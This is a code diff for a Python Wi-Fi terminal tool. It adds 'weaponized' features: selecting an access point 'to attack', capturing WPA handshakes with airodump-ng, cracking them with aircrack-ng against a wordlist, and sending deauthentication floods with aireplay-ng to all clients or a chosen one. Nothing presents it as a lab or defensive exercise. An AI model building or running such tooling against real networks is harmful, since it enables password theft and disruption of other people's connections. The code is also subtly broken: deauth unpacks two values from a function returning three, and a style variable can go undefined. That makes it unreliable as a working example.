@@ -126,49 +126,47 @@ def list_access_points():
 
 
 def list_access_points_ng():
-        banner("List of access points")
-        output = subprocess.run(["nmcli", "-t", "-f", "bssid,ssid,mode,chan,rate,signal,bars,security", "device", "wifi", "list"], capture_output=True, text=True)
-
-        table = Table(show_header=True, header_style=main_color, box=box.MINIMAL, leading=1)
+    banner("[!] Weaponized [!]")
+    list_devices()
+    device = Prompt.ask("Please enter the device you want to use")
+    banner("List of access points")
+    output = subprocess.run(["nmcli", "-t", "-f", "bssid,ssid,mode,chan,rate,signal,bars,security", "device", "wifi", "list"], capture_output=True, text=True)
+    table = Table(show_header=True, header_style=main_color, box=box.MINIMAL, leading=1)
+    
+    table.add_column("ID", style=main_color)
+    table.add_column("BSSID", style=main_color)
+    table.add_column("SSID", style=main_color)
+    table.add_column("Mode", style=main_color)
+    table.add_column("Channel", style=main_color)
+    table.add_column("Rate", style=main_color)
+    table.add_column("Signal", style=main_color)
+    table.add_column("Bars", style=main_color)
+    table.add_column("Security", style=main_color)
+    
+    bssid_list = []
+    channel_list = []
+    id_num = 0
+    for line in output.stdout.splitlines():
+        id_num += 1
+        line = re.sub(r'\\', '', line)
+        b1, b2, b3, b4, b5, b6, ssid, mode, chan, rate, signal, bars, security = line.split(":")
+        bssid = f"{b1}:{b2}:{b3}:{b4}:{b5}:{b6}"
+        channel_list.append(chan)
+        bssid_list.append(bssid)
+        if bars == "▂▄▆█":
+            bars_style = "green"
+        elif bars == "▂▄▆_":
+            bars_style = "yellow"
+        elif bars == "▂▄__":
+            bars_style = "gold3"
+        elif bars == "▂___":
+            bars_style = "red"
         
-        table.add_column("ID", style=main_color)
-        table.add_column("BSSID", style=main_color)
-        table.add_column("SSID", style=main_color)
-        table.add_column("Mode", style=main_color)
-        table.add_column("Channel", style=main_color)
-        table.add_column("Rate", style=main_color)
-        table.add_column("Signal", style=main_color)
-        table.add_column("Bars", style=main_color)
-        table.add_column("Security", style=main_color)
-        
-        bssid_list = []
-        channel_list = []
-        id_num = 0
-        for line in output.stdout.splitlines():
-            id_num += 1
-            line = re.sub(r'\\', '', line)
-            b1, b2, b3, b4, b5, b6, ssid, mode, chan, rate, signal, bars, security = line.split(":")
-            bssid = f"{b1}:{b2}:{b3}:{b4}:{b5}:{b6}"
-            channel_list.append(chan)
-            bssid_list.append(bssid)
-
-
-            if bars == "▂▄▆█":
-                bars_style = "green"
-            elif bars == "▂▄▆_":
-                bars_style = "yellow"
-            elif bars == "▂▄__":
-                bars_style = "gold3"
-            elif bars == "▂___":
-                bars_style = "red"
-            
-            table.add_row(str(id_num), bssid, ssid, mode, chan, rate, signal, bars, security, style=bars_style)
-
-        console.print(table, justify="center")
-
-        choice = Prompt.ask("Select an access point", choices=[str(i) for i in range(1, id_num + 1)])
-        
-        return bssid_list[int(choice) - 1], channel_list[int(choice) - 1]
+        table.add_row(str(id_num), bssid, ssid, mode, chan, rate, signal, bars, security, style=bars_style)
+    console.print(table, justify="center")
+    choice = Prompt.ask("Select an access point to attack", choices=[str(i) for i in range(1, id_num + 1)])
+    
+    return bssid_list[int(choice) - 1], channel_list[int(choice) - 1], device
 
 
 def connect_to_network():
@@ -184,6 +182,34 @@ def disconnect_from_network():
     ssid = Prompt.ask("Please enter the SSID of the network you want to disconnect from")
     output = subprocess.run(["nmcli", "device", "wifi", "disconnect", ssid], capture_output=True, text=True)
     console.print(output.stdout, justify="center")
+
+
+def capture_handshake():
+    bssid, channel, device = list_access_points_ng()
+    output = subprocess.run(["airodump-ng", "-c", channel, "--bssid", bssid, "-w", "handshake", device], capture_output=True, text=True)
+    console.print(output.stdout, justify="center")
+
+
+def crack_handshake():
+    banner("Cracking handshake")
+    wordlist = Prompt.ask("Please enter the path to the wordlist you want to use")
+    output = subprocess.run(["aircrack-ng", "handshake-01.cap", "-w", wordlist], capture_output=True, text=True)
+    console.print(output.stdout, justify="center")
+
+
+def deauth():
+    bssid, device = list_access_points_ng()
+    number_of_packets = Prompt.ask("Please enter the number of packets you want to send")
+
+    target = Prompt.ask("Do you want to deauth all clients or just one?", choices=["All", "One"])
+    if target == "All":
+        output = subprocess.run(["aireplay-ng", "-0", number_of_packets, "-a", bssid, device], capture_output=True, text=True)
+    elif target == "One":
+        client = Prompt.ask("Please enter the client's MAC address")
+        output = subprocess.run(["aireplay-ng", "-0", number_of_packets, "-a", bssid, "-c", client, device], capture_output=True, text=True)
+    
+    console.print(output.stdout, justify="center")
+
 
 def banner(msg, color="blue") -> None:
     term_width = get_terminal_width()
